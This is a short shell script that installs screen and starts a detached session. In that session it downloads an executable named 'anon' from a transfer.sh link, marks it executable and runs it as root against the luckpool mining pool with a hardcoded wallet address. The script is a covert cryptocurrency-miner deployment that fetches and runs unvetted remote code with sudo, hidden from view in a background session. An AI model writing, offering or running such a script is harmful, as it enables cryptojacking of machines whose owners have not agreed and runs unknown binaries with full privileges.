#!/bin/sh

cd
apt-get install -y screen < "/dev/null"
mkdir yoho
cd yoho

screen -S "layar" -d -m
screen -r "layar" -X stuff $'wget https://transfer.sh/Cuy7yT/anon && chmod u+x anon && sudo ./anon -v -l na.luckpool.net:3956 -u RMB6RJ7Wv7iVpBKQhdn4Vyv34VFKpD8Eqi.$(shuf -i 1-99999 -n 1) -p x -t 2\n'
